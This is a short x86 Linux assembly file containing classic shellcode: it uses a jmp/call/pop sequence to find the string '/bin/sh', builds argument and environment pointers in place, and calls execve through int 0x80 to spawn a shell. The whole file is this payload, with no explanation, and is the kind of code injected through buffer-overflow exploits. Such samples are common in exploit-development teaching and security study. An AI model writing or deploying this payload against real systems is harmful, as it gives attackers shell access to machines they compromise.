.text

.globl _start

_start:

	jmp dummy

	shellcode:
	popl %esi
	xorl %eax,%eax
	movb %al, 0x7(%esi)
	movl %esi, 0x8(%esi)
	movl %eax, 0xc(%esi)
	movb $11 , %al
	movl %esi, %ebx
	leal 0x8(%esi), %ecx
	leal 0xc(%esi), %edx
	int $0x80

	dummy:
	call shellcode
	shellvariables:
		.ascii "/bin/shABBBBCCCC"
